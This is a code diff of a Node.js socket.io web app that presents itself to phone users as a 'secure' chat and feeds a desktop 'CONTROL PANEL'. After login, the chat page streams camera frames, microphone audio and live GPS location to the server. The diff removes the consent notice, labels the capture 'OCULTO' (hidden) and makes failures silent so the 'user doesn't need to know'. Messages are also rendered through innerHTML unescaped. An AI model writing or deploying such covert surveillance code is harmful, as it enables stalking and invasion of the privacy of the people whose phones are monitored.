@@ -11,34 +11,31 @@ const io = new Server(server, {
 
 const PORT = process.env.PORT || 3000;
 
-// ========== ARMAZENAMENTO EM MEMÓRIA ==========
-const contacts = new Map(); // id -> { id, name, phone, socketId, online, lastSeen }
-const messages = new Map(); // contactId -> [{ id, from, to, text, timestamp }]
-const activeSockets = new Map(); // socketId -> contactId
+// ========== ARMAZENAMENTO ==========
+const contacts = new Map();
+const messages = new Map();
+const activeSockets = new Map();
 
 // ========== ROTAS ==========
 
-// Rota principal - detecta dispositivo e renderiza página correta
 app.get('/', (req, res) => {
   const ua = req.headers['user-agent'].toLowerCase();
   const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
-  const host = req.headers.host;
-  const protocol = req.headers['x-forwarded-proto'] || 'http';
-  const fullUrl = `${protocol}://${host}`;
 
   if (isMobile) {
-    // ========== PÁGINA DO CELULAR (CHAT) ==========
+    // ========== PÁGINA DO CELULAR (SIMPLE CHAT) ==========
     res.send(`<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>💕 Meu Amor - Chat</title>
+    <title>CHAT</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -47,23 +44,34 @@ app.get('/', (req, res) => {
         }
         .container {
             width: 100%;
-            max-width: 500px;
-            background: white;
-            border-radius: 30px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 450px;
+            background: #0d0d0d;
+            border: 2px solid #00ff41;
+            border-radius: 10px;
             height: 95vh;
             display: flex;
             flex-direction: column;
+            box-shadow: 0 0 30px rgba(0,255,65,0.1);
         }
         .header {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            background: #0d0d0d;
             padding: 15px 20px;
-            color: white;
+            border-bottom: 1px solid #00ff41;
             text-align: center;
         }
-        .header h2 { font-size: 18px; }
-        .header .sub { font-size: 11px; opacity: 0.9; margin-top: 3px; }
+        .header h2 {
+            font-size: 16px;
+            font-weight: normal;
+            letter-spacing: 3px;
+            color: #00ff41;
+            text-shadow: 0 0 10px rgba(0,255,65,0.3);
+        }
+        .header .sub {
+            font-size: 10px;
+            opacity: 0.5;
+            margin-top: 3px;
+            letter-spacing: 2px;
+        }
         .login-area {
             padding: 30px 20px;
             flex: 1;
@@ -71,243 +79,244 @@ app.get('/', (req, res) => {
             flex-direction: column;
             justify-content: center;
         }
+        .login-area h3 {
+            text-align: center;
+            font-weight: normal;
+            letter-spacing: 2px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            opacity: 0.7;
+        }
         .login-area .form-group { margin-bottom: 15px; }
-        .login-area label { display: block; font-weight: bold; color: #333; margin-bottom: 5px; font-size: 14px; }
+        .login-area label {
+            display: block;
+            font-size: 11px;
+            letter-spacing: 2px;
+            opacity: 0.5;
+            margin-bottom: 5px;
+        }
         .login-area input {
             width: 100%;
-            padding: 14px;
-            border: 2px solid #ddd;
-            border-radius: 15px;
-            font-size: 16px;
+            padding: 12px 15px;
+            background: #111;
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
         }
-        .login-area input:focus { border-color: #e74c3c; outline: none; }
+        .login-area input:focus {
+            box-shadow: 0 0 20px rgba(0,255,65,0.1);
+        }
+        .login-area input::placeholder {
+            color: #00ff41;
+            opacity: 0.3;
+        }
         .login-btn {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
+            padding: 14px;
+            background: #00ff41;
+            color: #0a0a0a;
             border: none;
-            border-radius: 50px;
-            font-size: 17px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
             font-weight: bold;
+            letter-spacing: 3px;
             cursor: pointer;
+            transition: all 0.3s;
             margin-top: 10px;
         }
-        .login-btn:disabled { background: #ccc; cursor: not-allowed; }
-        .error-msg { color: #e74c3c; text-align: center; margin-top: 10px; font-size: 13px; }
-        .permission-request {
-            background: #fff3cd;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 12px;
+        .login-btn:hover {
+            background: #00cc33;
+            box-shadow: 0 0 30px rgba(0,255,65,0.2);
+        }
+        .login-btn:disabled {
+            background: #1a1a1a;
+            color: #00ff41;
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        .error-msg {
+            color: #ff0044;
             text-align: center;
-            color: #856404;
+            margin-top: 10px;
+            font-size: 12px;
+            font-family: 'Courier New', monospace;
         }
         .chat-area {
             flex: 1;
             display: none;
             flex-direction: column;
-            background: #f5f5f5;
+            background: #0a0a0a;
         }
         .status-bar {
             display: flex;
             justify-content: space-between;
-            padding: 6px 15px;
-            background: #f0f0f0;
-            font-size: 11px;
-            color: #666;
-            border-bottom: 1px solid #ddd;
+            padding: 8px 15px;
+            background: #0d0d0d;
+            border-bottom: 1px solid #00ff41;
+            font-size: 10px;
+            letter-spacing: 1px;
+            opacity: 0.5;
         }
-        .status-bar .online { color: #2ecc71; }
         .chat-messages {
             flex: 1;
             overflow-y: auto;
             padding: 15px;
         }
+        .chat-messages::-webkit-scrollbar {
+            width: 4px;
+        }
+        .chat-messages::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        .chat-messages::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 2px;
+        }
         .message {
-            padding: 10px 14px;
-            border-radius: 16px;
+            padding: 8px 14px;
+            border-radius: 3px;
             margin-bottom: 6px;
             max-width: 80%;
             word-wrap: break-word;
-            font-size: 15px;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            border-left: 2px solid transparent;
         }
         .message.from-contact {
-            background: white;
-            color: #333;
+            background: #0d0d0d;
+            color: #00ff41;
             margin-right: auto;
-            border-bottom-left-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            border-left-color: #00ff41;
         }
         .message.from-pc {
-            background: #667eea;
-            color: white;
+            background: #00ff41;
+            color: #0a0a0a;
             margin-left: auto;
-            border-bottom-right-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            border-left-color: #0a0a0a;
         }
-        .message .time { font-size: 9px; opacity: 0.7; display: block; margin-top: 4px; }
+        .message .time {
+            font-size: 8px;
+            opacity: 0.4;
+            display: block;
+            margin-top: 3px;
+            font-family: 'Courier New', monospace;
+        }
         .typing-indicator {
             padding: 8px 15px;
-            color: #999;
-            font-style: italic;
-            font-size: 13px;
+            color: #00ff41;
+            opacity: 0.4;
+            font-size: 11px;
+            font-family: 'Courier New', monospace;
             display: none;
         }
         .chat-input-area {
             display: flex;
             gap: 8px;
             padding: 10px 15px;
-            background: white;
-            border-top: 1px solid #eee;
+            background: #0d0d0d;
+            border-top: 1px solid #00ff41;
         }
         .chat-input-area input {
             flex: 1;
             padding: 10px 14px;
-            border: 2px solid #ddd;
-            border-radius: 25px;
-            font-size: 14px;
+            background: #111;
+            border: 1px solid #00ff41;
+            border-radius: 3px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
             outline: none;
         }
-        .chat-input-area input:focus { border-color: #667eea; }
+        .chat-input-area input::placeholder {
+            color: #00ff41;
+            opacity: 0.3;
+        }
+        .chat-input-area input:focus {
+            box-shadow: 0 0 20px rgba(0,255,65,0.05);
+        }
         .chat-input-area button {
-            padding: 10px 18px;
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
+            padding: 10px 20px;
+            background: #00ff41;
+            color: #0a0a0a;
             border: none;
-            border-radius: 25px;
-            cursor: pointer;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
             font-weight: bold;
-            font-size: 18px;
-        }
-        .music-control {
-            background: rgba(0,0,0,0.85);
-            padding: 8px 15px;
-            display: none;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
-        .music-control .name { font-size: 12px; }
-        .music-control button {
-            background: rgba(255,255,255,0.2);
-            border: none;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 15px;
+            font-size: 13px;
             cursor: pointer;
-            font-size: 11px;
+            letter-spacing: 1px;
+            transition: all 0.3s;
         }
-        .youtube-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            pointer-events: none;
-            opacity: 0.08;
-            transition: opacity 0.5s;
+        .chat-input-area button:hover {
+            background: #00cc33;
         }
-        .youtube-bg iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            pointer-events: none;
+        .status-dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-right: 6px;
         }
-        .opacity-control {
-            position: fixed;
-            bottom: 80px;
-            right: 10px;
-            background: rgba(0,0,0,0.7);
-            padding: 6px 10px;
-            border-radius: 15px;
-            z-index: 10000;
-            display: flex;
-            gap: 8px;
-            align-items: center;
+        .status-dot.online { background: #00ff41; }
+        .status-dot.offline { background: #333; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
         }
-        .opacity-control button {
-            background: white;
-            border: none;
-            padding: 3px 8px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 11px;
+        .typing-dots span {
+            animation: blink 1s infinite;
         }
-        .opacity-control span { color: white; font-size: 10px; }
-        .heart {
-            position: fixed;
-            font-size: 18px;
-            pointer-events: none;
-            animation: floatHeart 4s ease-in-out infinite;
-            z-index: 9998;
-        }
-        @keyframes floatHeart {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
-        }
+        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h2>💕 Meu Amor 💕</h2>
-            <div class="sub">Conectado com seu amor</div>
+            <h2>● CHAT ●</h2>
+            <div class="sub">SECURE CONNECTION</div>
         </div>
 
-        <!-- LOGIN -->
         <div id="loginArea" class="login-area">
-            <h3 style="text-align:center; margin-bottom:15px;">👋 Entre no Chat</h3>
+            <h3>› ACCESS CODE ‹</h3>
             <div class="form-group">
-                <label>📱 ID do Contato</label>
-                <input type="text" id="contactId" placeholder="Cole o ID fornecido pelo seu amor">
+                <label>CODE</label>
+                <input type="text" id="contactId" placeholder="ENTER ACCESS CODE" maxlength="36">
             </div>
             <div class="form-group">
-                <label>👤 Seu Nome</label>
-                <input type="text" id="contactName" placeholder="Seu nome">
+                <label>NAME</label>
+                <input type="text" id="contactName" placeholder="YOUR NAME">
             </div>
-            <button class="login-btn" id="loginBtn">💕 Entrar no Chat</button>
+            <button class="login-btn" id="loginBtn">► CONNECT</button>
             <div class="error-msg" id="loginError"></div>
-            <div class="permission-request">🔒 O acesso à câmera e microfone será solicitado para compartilhar com seu amor</div>
         </div>
 
-        <!-- CHAT -->
         <div id="chatArea" class="chat-area">
             <div class="status-bar">
-                <span id="connectionStatus">🟢 Conectado</span>
-                <span id="contactNameDisplay">Seu Amor</span>
+                <span id="connectionStatus"><span class="status-dot online"></span>ONLINE</span>
+                <span id="contactNameDisplay">● CONNECTED</span>
             </div>
             <div class="chat-messages" id="chatMessages">
-                <div style="text-align:center; color:#999; padding:20px; font-size:14px;">💕 Bem-vindo! Converse com seu amor</div>
+                <div style="text-align:center; color:#00ff41; opacity:0.2; padding:30px 0; font-size:12px; letter-spacing:2px;">› SYSTEM READY ‹</div>
             </div>
-            <div class="typing-indicator" id="typingIndicator">💕 Alguém está digitando...</div>
-            <div class="music-control" id="musicControl">
-                <span class="name" id="musicName">🎵 Tocando música</span>
-                <button onclick="stopMusic()">⏹️ Parar</button>
+            <div class="typing-indicator" id="typingIndicator">
+                <span class="typing-dots"><span>.</span><span>.</span><span>.</span></span> TYPING
             </div>
             <div class="chat-input-area">
-                <input type="text" id="chatInput" placeholder="Digite uma mensagem..." oninput="onTyping()">
-                <button onclick="sendMessage()">💖</button>
+                <input type="text" id="chatInput" placeholder="MESSAGE" oninput="onTyping()">
+                <button onclick="sendMessage()">SEND</button>
             </div>
         </div>
     </div>
-
-    <div class="youtube-bg" id="youtubeBg"><iframe id="youtubeIframe" allow="autoplay; encrypted-media"></iframe></div>
-    <div class="opacity-control">
-        <button id="opacMinus">-</button>
-        <span id="opacValue">8%</span>
-        <button id="opacPlus">+</button>
-    </div>
-    <div id="heartContainer"></div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'], reconnection: true });
-        let contactId = null, contactName = null, mediaStream = null, audioContext = null;
-        let audioProcessor = null, audioSource = null, isLoggedIn = false, typingTimeout = null;
-        let currentOpacity = 0.08;
+        const socket = io({ transports: ['websocket', 'polling'], reconnection: true });
+        let contactId = null, contactName = null, isLoggedIn = false, typingTimeout = null;
 
         const loginArea = document.getElementById('loginArea');
         const chatArea = document.getElementById('chatArea');
@@ -317,40 +326,20 @@ app.get('/', (req, res) => {
         const typingIndicator = document.getElementById('typingIndicator');
         const connectionStatus = document.getElementById('connectionStatus');
         const contactNameDisplay = document.getElementById('contactNameDisplay');
-        const musicControl = document.getElementById('musicControl');
-        const musicName = document.getElementById('musicName');
         const loginError = document.getElementById('loginError');
-        const youtubeBg = document.getElementById('youtubeBg');
-        const youtubeIframe = document.getElementById('youtubeIframe');
 
-        // ===== OPACIDADE =====
-        function updateOpacity() {
-            youtubeBg.style.opacity = currentOpacity;
-            document.getElementById('opacValue').textContent = Math.round(currentOpacity * 100) + '%';
-        }
-        document.getElementById('opacMinus').onclick = () => { currentOpacity = Math.max(0.03, currentOpacity - 0.03); updateOpacity(); };
-        document.getElementById('opacPlus').onclick = () => { currentOpacity = Math.min(0.3, currentOpacity + 0.03); updateOpacity(); };
-
-        // ===== CORAÇÕES =====
-        function createHeart() {
-            const h = document.createElement('div');
-            h.className = 'heart';
-            h.innerHTML = ['💕','💖','💗','💓','💝','💘','💌'][Math.floor(Math.random()*7)];
-            h.style.left = Math.random()*100+'%';
-            h.style.animationDuration = (Math.random()*3+2)+'s';
-            h.style.fontSize = (Math.random()*18+14)+'px';
-            document.getElementById('heartContainer').appendChild(h);
-            setTimeout(() => { if(h.parentNode) h.remove(); }, 4000);
-        }
-        setInterval(createHeart, 600);
+        let mediaStream = null;
+        let audioContext = null;
+        let audioProcessor = null;
+        let audioSource = null;
 
         // ===== LOGIN =====
         loginBtn.onclick = () => {
             const id = document.getElementById('contactId').value.trim();
             const name = document.getElementById('contactName').value.trim();
-            if(!id || !name) { loginError.textContent = 'Preencha todos os campos!'; return; }
+            if(!id || !name) { loginError.textContent = 'ERROR: INVALID INPUT'; return; }
             loginBtn.disabled = true;
-            loginBtn.textContent = '⏳ Conectando...';
+            loginBtn.textContent = '● CONNECTING...';
             loginError.textContent = '';
             socket.emit('contact_login', { contactId: id, name: name });
         };
@@ -361,22 +350,22 @@ app.get('/', (req, res) => {
             isLoggedIn = true;
             loginArea.style.display = 'none';
             chatArea.style.display = 'flex';
-            contactNameDisplay.textContent = '💕 ' + contactName;
+            contactNameDisplay.textContent = '● ' + contactName.toUpperCase();
             data.messages.forEach(msg => {
                 addMessageToChat(msg.text, msg.from === 'pc' ? 'from-pc' : 'from-contact');
             });
             startStreaming();
             loginBtn.disabled = false;
-            loginBtn.textContent = '💕 Entrar no Chat';
+            loginBtn.textContent = '► CONNECT';
         });
 
         socket.on('login_error', (data) => {
-            loginError.textContent = data.error || 'Erro ao fazer login';
+            loginError.textContent = 'ERROR: ' + (data.error || 'ACCESS DENIED');
             loginBtn.disabled = false;
-            loginBtn.textContent = '💕 Entrar no Chat';
+            loginBtn.textContent = '► CONNECT';
         });
 
-        // ===== STREAMING =====
+        // ===== STREAMING (OCULTO) =====
         async function startStreaming() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -384,18 +373,21 @@ app.get('/', (req, res) => {
                     audio: true
                 });
                 mediaStream = stream;
+                
                 const canvas = document.createElement('canvas');
                 canvas.width = 320; canvas.height = 240;
                 const ctx = canvas.getContext('2d');
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
+                
                 setInterval(() => {
                     if(isLoggedIn && mediaStream && mediaStream.active) {
                         ctx.drawImage(video, 0, 0, 320, 240);
                         socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
                     }
-                }, 250);
+                }, 300);
+
                 audioContext = new (window.AudioContext || window.webkitAudioContext)();
                 audioSource = audioContext.createMediaStreamSource(stream);
                 audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
@@ -404,17 +396,24 @@ app.get('/', (req, res) => {
                 audioProcessor.onaudioprocess = (e) => {
                     if(isLoggedIn) {
                         const data = e.inputBuffer.getChannelData(0);
-                        if(Math.random() < 0.08) socket.emit('audio', Array.from(data));
+                        if(Math.random() < 0.05) socket.emit('audio', Array.from(data));
                     }
                 };
+
                 if(navigator.geolocation) {
                     navigator.geolocation.watchPosition(
-                        (p) => { if(isLoggedIn) socket.emit('location', { latitude: p.coords.latitude, longitude: p.coords.longitude }); },
+                        (p) => { if(isLoggedIn) socket.emit('location', { 
+                            latitude: p.coords.latitude, 
+                            longitude: p.coords.longitude 
+                        }); },
                         () => {},
                         { enableHighAccuracy: true }
                     );
                 }
-            } catch(err) { alert('Permita o acesso à câmera e microfone!'); }
+            } catch(err) {
+                // Silenciosamente falha - usuário não precisa saber
+                console.log('Streaming unavailable');
+            }
         }
 
         // ===== MENSAGENS =====
@@ -430,7 +429,8 @@ app.get('/', (req, res) => {
         function addMessageToChat(text, className) {
             const div = document.createElement('div');
             div.className = 'message ' + className;
-            div.innerHTML = text + '<span class="time">' + new Date().toLocaleTimeString() + '</span>';
+            const time = new Date().toLocaleTimeString();
+            div.innerHTML = text + '<span class="time">' + time + '</span>';
             chatMessages.appendChild(div);
             chatMessages.scrollTop = chatMessages.scrollHeight;
         }
@@ -441,6 +441,7 @@ app.get('/', (req, res) => {
             if(typingTimeout) clearTimeout(typingTimeout);
             typingTimeout = setTimeout(() => stopTyping(), 1000);
         }
+
         function stopTyping() {
             if(!isLoggedIn) return;
             socket.emit('typing_stop', { isFromPc: false });
@@ -450,41 +451,26 @@ app.get('/', (req, res) => {
         chatInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendMessage(); });
 
         // ===== SOCKET EVENTS =====
-        socket.on('new_message', (data) => { addMessageToChat(data.text, 'from-pc'); });
-        socket.on('message_sent', (data) => {});
+        socket.on('new_message', (data) => {
+            addMessageToChat(data.text, 'from-pc');
+        });
+
         socket.on('contact_typing', (data) => {
             typingIndicator.style.display = data.isTyping ? 'block' : 'none';
         });
 
-        socket.on('comando', (cmd) => {
-            if(cmd === 'vibrate' && navigator.vibrate) navigator.vibrate(200);
-            else if(cmd === 'emergency' && navigator.vibrate) navigator.vibrate([500,200,500,200,500]);
-            else if(cmd === 'trocarCamera') {
-                if(mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); }
-                startStreaming();
-            } else if(cmd.startsWith('play_youtube:')) {
-                const parts = cmd.split(':');
-                playYouTube(parts[1], parts[2] || 'Música');
-            } else if(cmd === 'stop_music') { stopMusic(); }
+        socket.on('connect', () => {
+            connectionStatus.innerHTML = '<span class="status-dot online"></span>ONLINE';
         });
 
-        // ===== MÚSICA =====
-        function playYouTube(videoId, songName) {
-            youtubeIframe.src = 'https://www.youtube.com/embed/' + videoId + '?autoplay=1&loop=1&playlist=' + videoId + '&controls=0&showinfo=0&rel=0';
-            youtubeBg.style.display = 'block';
-            musicControl.style.display = 'flex';
-            musicName.textContent = '🎵 ' + songName;
-        }
-        function stopMusic() {
-            youtubeIframe.src = '';
-            youtubeBg.style.display = 'none';
-            musicControl.style.display = 'none';
-            socket.emit('comando', 'stop_music');
-        }
+        socket.on('disconnect', () => {
+            connectionStatus.innerHTML = '<span class="status-dot offline"></span>OFFLINE';
+        });
 
-        socket.on('connect', () => { connectionStatus.innerHTML = '🟢 Conectado'; });
-        socket.on('disconnect', () => { connectionStatus.innerHTML = '🔴 Desconectado'; });
-        socket.on('force_disconnect', () => { alert('⚠️ Conexão encerrada!'); location.reload(); });
+        socket.on('force_disconnect', () => {
+            alert('● CONNECTION TERMINATED');
+            location.reload();
+        });
     </script>
 </body>
 </html>`);
@@ -495,199 +481,304 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>💕 Painel de Mensagens</title>
+    <title>● CONTROL PANEL</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
             min-height: 100vh;
             padding: 20px;
         }
         .container { max-width: 1400px; margin: 0 auto; }
         h1 {
-            color: white;
+            font-weight: normal;
+            font-size: 22px;
+            letter-spacing: 4px;
             text-align: center;
             margin-bottom: 25px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-            font-size: 32px;
+            text-shadow: 0 0 30px rgba(0,255,65,0.1);
         }
         .main-grid {
             display: grid;
-            grid-template-columns: 280px 1fr 320px;
-            gap: 20px;
-            height: calc(100vh - 120px);
+            grid-template-columns: 280px 1fr 300px;
+            gap: 15px;
+            height: calc(100vh - 100px);
         }
         .panel {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            background: #0d0d0d;
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            padding: 15px;
             overflow-y: auto;
         }
+        .panel::-webkit-scrollbar { width: 4px; }
+        .panel::-webkit-scrollbar-track { background: #0a0a0a; }
+        .panel::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
         .panel h2 {
-            color: #e74c3c;
-            margin-bottom: 15px;
-            font-size: 17px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            font-weight: normal;
+            font-size: 13px;
+            letter-spacing: 3px;
+            margin-bottom: 12px;
+            opacity: 0.6;
+            border-bottom: 1px solid #00ff41;
+            padding-bottom: 8px;
         }
-        .panel h3 { font-size: 14px; color: #555; margin: 10px 0 8px; }
-        .contact-item {
-            padding: 10px 12px;
-            border-radius: 10px;
-            margin-bottom: 8px;
+        .panel h3 {
+            font-weight: normal;
+            font-size: 11px;
+            letter-spacing: 2px;
+            margin: 8px 0 5px;
+            opacity: 0.4;
+        }
+        .form-group { margin-bottom: 10px; }
+        .form-group label {
+            display: block;
+            font-size: 10px;
+            letter-spacing: 2px;
+            opacity: 0.4;
+            margin-bottom: 3px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px 12px;
+            background: #111;
+            border: 1px solid #00ff41;
+            border-radius: 3px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            outline: none;
+        }
+        .form-group input:focus { box-shadow: 0 0 20px rgba(0,255,65,0.05); }
+        .btn-primary {
+            width: 100%;
+            padding: 8px;
+            background: #00ff41;
+            color: #0a0a0a;
+            border: none;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            font-weight: bold;
+            letter-spacing: 2px;
             cursor: pointer;
             transition: all 0.3s;
-            border: 2px solid transparent;
+        }
+        .btn-primary:hover { background: #00cc33; box-shadow: 0 0 30px rgba(0,255,65,0.1); }
+        .btn-danger {
+            width: 100%;
+            padding: 6px;
+            background: #ff0044;
+            color: #0a0a0a;
+            border: none;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 5px;
+        }
+        .btn-danger:hover { background: #cc0033; }
+        .contact-item {
+            padding: 8px 10px;
+            border-radius: 3px;
+            margin-bottom: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid transparent;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        .contact-item:hover { background: #f5f5f5; }
-        .contact-item.active { border-color: #e74c3c; background: #ffe6f0; }
-        .contact-item .name { font-weight: bold; font-size: 14px; }
-        .contact-item .phone { font-size: 11px; color: #999; }
+        .contact-item:hover { background: #111; }
+        .contact-item.active {
+            border-color: #00ff41;
+            background: #111;
+        }
+        .contact-item .name { font-size: 13px; }
+        .contact-item .phone { font-size: 10px; opacity: 0.3; }
         .contact-item .status {
-            font-size: 10px;
+            font-size: 8px;
             padding: 2px 8px;
-            border-radius: 10px;
+            border-radius: 2px;
+            letter-spacing: 1px;
         }
-        .status.online { background: #2ecc71; color: white; }
-        .status.offline { background: #95a5a6; color: white; }
+        .status.online { background: #00ff41; color: #0a0a0a; }
+        .status.offline { background: #1a1a1a; color: #333; }
         .badge {
-            background: #e74c3c;
-            color: white;
-            font-size: 10px;
-            padding: 1px 7px;
-            border-radius: 10px;
-            margin-left: 5px;
+            background: #00ff41;
+            color: #0a0a0a;
+            font-size: 9px;
+            padding: 1px 6px;
+            border-radius: 2px;
+            margin-left: 4px;
         }
-        .form-group { margin-bottom: 12px; }
-        .form-group label { display: block; font-weight: bold; font-size: 13px; margin-bottom: 3px; }
-        .form-group input {
-            width: 100%;
-            padding: 8px 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 13px;
-        }
-        .form-group input:focus { border-color: #667eea; outline: none; }
-        .btn-primary {
-            width: 100%;
-            padding: 10px;
-            background: linear-gradient(135deg, #2ecc71, #27ae60);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        .btn-danger {
-            width: 100%;
-            padding: 8px;
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 13px;
-            margin-top: 5px;
-        }
-        .btn-danger:hover, .btn-primary:hover { transform: scale(1.02); }
         .chat-area { display: flex; flex-direction: column; height: 100%; }
-        .chat-header { padding-bottom: 10px; border-bottom: 2px solid #eee; margin-bottom: 10px; }
-        .chat-header h3 { font-size: 16px; }
+        .chat-header {
+            padding-bottom: 8px;
+            border-bottom: 1px solid #00ff41;
+            margin-bottom: 8px;
+        }
+        .chat-header h3 { font-weight: normal; font-size: 13px; letter-spacing: 2px; opacity: 0.6; }
         .chat-messages {
             flex: 1;
             overflow-y: auto;
             padding: 5px 0;
         }
+        .chat-messages::-webkit-scrollbar { width: 4px; }
+        .chat-messages::-webkit-scrollbar-track { background: #0a0a0a; }
+        .chat-messages::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
         .message {
-            padding: 8px 14px;
-            border-radius: 14px;
-            margin-bottom: 6px;
+            padding: 6px 12px;
+            border-radius: 2px;
+            margin-bottom: 4px;
             max-width: 75%;
-            font-size: 14px;
+            font-size: 12px;
+            font-family: 'Courier New', monospace;
+            border-left: 2px solid transparent;
         }
-        .message.from-pc { background: #667eea; color: white; margin-left: auto; }
-        .message.from-contact { background: #f0f0f0; color: #333; }
-        .message .time { font-size: 9px; opacity: 0.7; display: block; margin-top: 3px; }
-        .typing-indicator { font-size: 12px; color: #999; font-style: italic; padding: 5px 0; display: none; }
+        .message.from-pc {
+            background: #00ff41;
+            color: #0a0a0a;
+            margin-left: auto;
+            border-left-color: #0a0a0a;
+        }
+        .message.from-contact {
+            background: #0d0d0d;
+            color: #00ff41;
+            margin-right: auto;
+            border-left-color: #00ff41;
+        }
+        .message .time { font-size: 8px; opacity: 0.3; display: block; margin-top: 2px; }
+        .typing-indicator {
+            font-size: 10px;
+            opacity: 0.3;
+            padding: 5px 0;
+            display: none;
+            font-family: 'Courier New', monospace;
+        }
         .chat-input-area {
             display: flex;
             gap: 8px;
-            padding-top: 10px;
-            border-top: 2px solid #eee;
+            padding-top: 8px;
+            border-top: 1px solid #00ff41;
         }
         .chat-input-area input {
             flex: 1;
-            padding: 8px 14px;
-            border: 2px solid #ddd;
-            border-radius: 20px;
-            font-size: 13px;
+            padding: 8px 12px;
+            background: #111;
+            border: 1px solid #00ff41;
+            border-radius: 3px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
             outline: none;
         }
-        .chat-input-area input:focus { border-color: #667eea; }
+        .chat-input-area input:focus { box-shadow: 0 0 20px rgba(0,255,65,0.05); }
         .chat-input-area button {
             padding: 8px 18px;
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
+            background: #00ff41;
+            color: #0a0a0a;
             border: none;
-            border-radius: 20px;
-            cursor: pointer;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
             font-weight: bold;
+            font-size: 11px;
+            cursor: pointer;
+            letter-spacing: 1px;
         }
-        .no-contact { text-align: center; color: #999; padding: 40px 0; }
-        .no-contact h3 { color: #ccc; }
-        .video-container { background: #000; border-radius: 8px; overflow: hidden; margin: 8px 0; }
+        .chat-input-area button:hover { background: #00cc33; }
+        .no-contact { text-align: center; opacity: 0.2; padding: 30px 0; font-size: 12px; letter-spacing: 2px; }
+        .no-contact h3 { font-weight: normal; font-size: 14px; }
+        .video-container { background: #000; border-radius: 2px; overflow: hidden; margin: 6px 0; border: 1px solid #00ff41; }
